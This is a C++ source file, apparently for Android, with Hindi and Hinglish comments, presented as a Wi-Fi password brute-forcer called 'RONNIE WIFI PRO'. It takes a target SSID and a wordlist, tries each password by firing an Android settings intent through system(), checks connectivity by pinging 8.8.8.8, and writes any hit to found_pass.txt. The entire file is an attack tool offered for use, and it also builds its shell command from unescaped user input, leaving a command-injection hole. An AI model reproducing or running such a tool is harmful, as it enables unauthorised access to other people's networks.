#include <iostream>
#include <string>
#include <fstream>
#include <unistd.h>

using namespace std;

// कलर कोड्स
#define RESET   "\033[0m"
#define RED     "\033[31m"
#define GREEN   "\033[32m"
#define YELLOW  "\033[33m"
#define CYAN    "\033[36m"
#define BOLD    "\033[1m"

// इंटरनेट कनेक्शन चेक करने के लिए (Ping Test)
bool isConnected() {
    // 8.8.8.8 (Google DNS) को 1 पैकेट भेजकर चेक करना
    int res = system("ping -c 1 -W 2 8.8.8.8 > /dev/null 2>&1");
    return (res == 0);
}

int main() {
    system("clear");
    cout << CYAN << BOLD << "===========================================" << endl;
    cout << "      RONNIE WIFI PRO (PRECISE MODE)       " << endl;
    cout << "===========================================" << RESET << endl;

    string ssid, wordlist;
    int sleepTime;

    cout << CYAN << "Target SSID: " << RESET;
    if (!(cin >> ws)) return 0;
    getline(cin, ssid);

    cout << CYAN << "Wordlist Path: " << RESET;
    getline(cin, wordlist);

    cout << CYAN << "Sleep Time (Seconds me, e.g., 10): " << RESET;
    cin >> sleepTime;

    ifstream file(wordlist.c_str());
    if (!file.is_open()) {
        cout << RED << "[-] Error: Wordlist file nahi mili!" << RESET << endl;
        return 1;
    }

    string pass;
    int line_count = 0;
    bool success = false;

    cout << YELLOW << "\n[*] Attack Started... Kali Linux style results active." << RESET << endl;
    cout << "-------------------------------------------" << endl;

    while (getline(file, pass)) {
        line_count++;
        
        // पासवर्ड क्लीनिंग
        if (!pass.empty() && (pass.back() == '\r' || pass.back() == '\n')) pass.pop_back();
        if (pass.length() < 8) continue;

        cout << CYAN << "[" << line_count << "] TRYING: " << pass << flush;

        // एंड्रॉइड इंटेंट भेजें (बिना रूट के पासवर्ड इंजेक्ट करने का तरीका)
        string cmd = "am start -a android.intent.action.MAIN -n com.android.settings/.wifi.WriteWifiConfig --es ssid \"" + ssid + "\" --es password \"" + pass + "\" > /dev/null 2>&1";
        system(cmd.c_str());

        // यूजर द्वारा सेट किया गया वेट टाइम
        sleep(sleepTime); 

        if (isConnected()) {
            cout << GREEN << " >> [SUCCESS!]" << RESET << endl;
            cout << GREEN << BOLD << "\n[+] SAHI PASSWORD MIL GAYA: " << pass << RESET << endl;
            
            // फाइल में सेव करें
            ofstream save("found_pass.txt", ios::app);
            save << "SSID: " << ssid << " | PASS: " << pass << endl;
            save.close();
            
            success = true;
            break; 
        } else {
            // काली लिनक्स की तरह सिर्फ 'FAILED' दिखाएगा
            cout << RED << " >> [FAILED]" << RESET << endl;
        }
    }

    if (!success) {
        cout << RED << "\n[-] Attack Complete. Wordlist me sahi password nahi mila." << RESET << endl;
    }

    file.close();
    return 0;
}
